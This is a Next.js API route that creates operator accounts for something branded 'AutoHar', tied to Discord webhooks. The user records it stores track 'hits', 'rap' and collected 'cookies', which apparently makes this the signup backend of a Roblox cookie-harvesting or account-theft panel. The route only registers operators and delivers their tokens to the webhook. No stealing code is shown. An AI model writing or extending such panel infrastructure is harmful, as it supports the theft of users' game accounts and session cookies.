import { NextResponse } from 'next/server'
import { generateToken, encrypt } from '@/lib/crypto'
import { sendWebhook } from '@/lib/webhook'

const users = new Map()

export async function POST(req) {
  const { directory, webhookUrl } = await req.json()

  if (!directory || !webhookUrl) {
    return NextResponse.json({ success: false, message: 'Directory and webhook required' }, { status: 400 })
  }

  if (!/^[a-zA-Z0-9_-]+$/.test(directory)) {
    return NextResponse.json({ success: false, message: 'Directory can only contain letters, numbers, underscores, hyphens' }, { status: 400 })
  }

  if (!webhookUrl.includes('discord.com/api/webhooks/')) {
    return NextResponse.json({ success: false, message: 'Invalid Discord webhook URL' }, { status: 400 })
  }

  if (users.has(directory)) {
    return NextResponse.json({ success: false, message: 'Directory already taken' }, { status: 409 })
  }

  const token = generateToken(20)
  const user = {
    directory,
    webhookUrl,
    token,
    displayName: 'AutoHar User',
    hits: 0,
    rap: 0,
    cookies: [],
    createdAt: new Date().toISOString()
  }

  users.set(directory, user)

  await sendWebhook(webhookUrl, {
    embeds: [{
      title: 'Account Created',
      description: `**Directory:** \`${directory}\`\n\n**Token:**\n\`\`\`\n${token}\n\`\`\``,
      color: 0x00ff00,
      timestamp: new Date().toISOString()
    }]
  })

  try {
    await fetch(webhookUrl, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name: 'AutoHar Create' })
    })
  } catch {}

  const session = encrypt(JSON.stringify({ directory, token }))
  const res = NextResponse.json({ success: true, message: 'Created. Check your webhook for token.' })
  res.cookies.set('rc_session', session, { httpOnly: true, maxAge: 60 * 60 * 24 * 30, path: '/' })
  return res
}

export { users }
